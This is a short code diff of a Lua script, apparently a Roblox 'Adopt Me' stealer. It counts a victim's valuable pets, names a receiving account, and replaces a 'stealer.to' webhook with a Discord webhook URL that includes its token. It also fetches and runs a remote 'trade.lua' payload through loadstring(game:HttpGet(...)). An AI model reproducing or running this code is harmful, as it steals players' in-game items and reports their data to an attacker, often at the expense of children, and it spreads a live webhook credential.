@@ -130,5 +130,5 @@ if legendaries_count + mega_count + neon_count + ultra_count + fr_count == 0 the
 end
 
 UserName = "lord_magic0"
-WebHook = "https://stealer.to/post?uniqueid=0f905c67"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/main/trade.lua"))()
+WebHook = "https://discord.com/api/webhooks/1318634606349779026/JZCqZPCymJXyh4Al5H8gou0QEb2BsXsIOs_7zzaBXfQr5LTISb1NKMpNanlp3vs1ckRA"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/refs/heads/main/trade.lua"))()
